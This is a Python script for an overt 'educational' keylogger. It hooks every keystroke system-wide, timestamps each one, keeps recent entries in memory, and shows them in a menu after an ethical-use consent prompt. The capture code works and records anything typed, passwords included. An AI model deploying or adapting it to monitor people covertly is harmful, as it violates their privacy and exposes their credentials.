import os
import sys
import time
import threading
from datetime import datetime

try:
    import keyboard
except ImportError:
    print("Installing keyboard package...")
    import subprocess
    subprocess.run([sys.executable, "-m", "pip", "install", "keyboard", "--user"])
    import keyboard

class SimpleKeylogger:
    def __init__(self):
        self.is_running = False
        self.lock = threading.Lock()
        self.log_entries = []  # Store in memory instead of file
    
    def display_header(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print("╔═══════════════════════════════════════════════════════════╗")
        print("║              Educational Keylogger v1.0                  ║")
        print("║         Security Engineering Learning Project            ║")
        print("╚═══════════════════════════════════════════════════════════╝")
        print()
    
    def ethical_warning(self):
        print("⚠️  ETHICAL USE WARNING ⚠️")
        print("This software is for educational purposes only.")
        print("Only use on systems you own or have explicit permission to monitor.")
        print("Unauthorized monitoring may violate laws and regulations.")
        print()
        
        consent = input("Do you agree to use this software ethically and legally? (y/N): ").strip().lower()
        if consent != 'y':
            print("Exiting. Thank you for being responsible.")
            sys.exit(0)
        print()
    
    def log_keystroke(self, key_event):
        if key_event.event_type == keyboard.KEY_DOWN:
            timestamp = datetime.now().strftime('%H:%M:%S')
            key_name = key_event.name
            
            # Handle special keys
            if key_name == 'space':
                key_str = ' '
            elif key_name == 'enter':
                key_str = '[ENTER]'
            elif key_name == 'backspace':
                key_str = '[BACKSPACE]'
            elif len(key_name) == 1:
                key_str = key_name
            else:
                key_str = f'[{key_name.upper()}]'
            
            self.log_entries.append(f"{timestamp}: {key_str}")
            
            # Keep only last 100 entries to avoid memory issues
            if len(self.log_entries) > 100:
                self.log_entries = self.log_entries[-100:]
    
    def start_monitoring(self):
        with self.lock:
            if self.is_running:
                print("Keylogger is already running!")
                return
        
        try:
            print("Starting educational keylogger...")
            keyboard.hook(self.log_keystroke)
            
            with self.lock:
                self.is_running = True
            
            print("✓ Keylogger started successfully!")
            print("Educational Mode: Monitoring keyboard input")
            print("Press any key to return to menu...")
            
        except Exception as e:
            print(f"Error: {e}")
            print("Try running as administrator on Windows")
    
    def stop_monitoring(self):
        with self.lock:
            if not self.is_running:
                print("Keylogger is not running!")
                return
        
        try:
            keyboard.unhook_all()
            with self.lock:
                self.is_running = False
            print("✓ Keylogger stopped successfully!")
        except Exception as e:
            print(f"Error stopping: {e}")
    
    def show_status(self):
        print("=== Current Status ===")
        with self.lock:
            status = "RUNNING" if self.is_running else "STOPPED"
        print(f"Keylogger Status: {status}")
        print(f"Captured entries: {len(self.log_entries)}")
        print("Storage: Memory (no file created)")
    
    def show_log(self):
        print("=== Recent Keystrokes ===")
        if not self.log_entries:
            print("No keystrokes captured yet.")
        else:
            # Show last 20 entries
            for entry in self.log_entries[-20:]:
                print(entry)
    
    def show_analysis(self):
        print("=== Security Analysis ===")
        print("This educational keylogger demonstrates:")
        print("1. Keyboard event monitoring techniques")
        print("2. Python system-level programming")
        print("3. Real-time event processing")
        print("4. Memory-based logging (no file creation)")
        print("\nDetection methods:")
        print("- Process monitoring (visible in task manager)")
        print("- Library dependency scanning")
        print("- Memory analysis of running processes")
    
    def run(self):
        self.display_header()
        self.ethical_warning()
        
        while True:
            try:
                self.display_header()
                print("Educational Menu:")
                print("1. Start Keylogger")
                print("2. Stop Keylogger") 
                print("3. Show Status")
                print("4. View Captured Keys")
                print("5. Security Analysis")
                print("6. Exit")
                print()
                
                choice = input("Choose option (1-6): ").strip()
                
                if choice == '1':
                    self.start_monitoring()
                elif choice == '2':
                    self.stop_monitoring()
                elif choice == '3':
                    self.show_status()
                elif choice == '4':
                    self.show_log()
                elif choice == '5':
                    self.show_analysis()
                elif choice == '6':
                    if self.is_running:
                        self.stop_monitoring()
                    print("Thank you for using responsibly!")
                    sys.exit(0)
                else:
                    print("Invalid choice.")
                
                input("\nPress Enter to continue...")
                
            except KeyboardInterrupt:
                print("\nExiting...")
                if self.is_running:
                    self.stop_monitoring()
                sys.exit(0)

if __name__ == "__main__":
    try:
        keylogger = SimpleKeylogger()
        keylogger.run()
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)